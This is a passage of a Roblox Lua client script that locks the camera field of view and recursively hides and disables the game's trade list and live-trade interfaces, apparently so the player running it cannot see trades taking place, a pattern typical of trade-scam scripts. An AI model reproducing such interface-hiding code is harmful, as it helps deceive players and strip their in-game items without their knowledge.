-- ===== ФИКСАЦИЯ FOV =====
local function fixFOV()
    if camera then
        camera.FieldOfView = 70
    end
end

fixFOV()

local cameraConnection
if camera then
    cameraConnection = camera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
        if camera.FieldOfView ~= 70 then
            camera.FieldOfView = 70
        end
    end)
end

workspace.ChildAdded:Connect(function(child)
    if child.Name == "Camera" then
        camera = child
        fixFOV()
        if cameraConnection then cameraConnection:Disconnect() end
        cameraConnection = camera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
            if camera.FieldOfView ~= 70 then
                camera.FieldOfView = 70
            end
        end)
    end
end)

-- ===== Функция перемещения GUI за экран =====
local function moveOffScreen(obj)
    if not obj then return end
    pcall(function()
        obj.Position = UDim2.new(10, 0, 10, 0)
        obj.Size = UDim2.new(0, 0, 0, 0)
        if obj:IsA("Frame") or obj:IsA("ImageLabel") or obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("ImageButton") or obj:IsA("ScrollingFrame") then
            obj.Visible = false
            obj.Active = false
            obj.Selectable = false
            obj.AutoButtonColor = false
            obj.Interactable = false
        end
    end)
    for _, child in pairs(obj:GetChildren()) do
        moveOffScreen(child)
    end
end

local function processTradePlayerList()
    local tradePlayerList = player.PlayerGui:FindFirstChild("TradePlayerList")
    if not tradePlayerList then return end
    local mainFrame = tradePlayerList:FindFirstChild("TradePlayerList")
    if mainFrame then
        moveOffScreen(mainFrame)
    end
end

local function processTradeLiveTrade()
    local tradeLiveTrade = player.PlayerGui:FindFirstChild("TradeLiveTrade")
    if not tradeLiveTrade then return end
    moveOffScreen(tradeLiveTrade)
end

local function removeBlurEffect()
    local camera = workspace:FindFirstChild("Camera")
    if camera then
        local blur = camera:FindFirstChild("Blur")
        if blur then blur:Destroy() end
    end
end

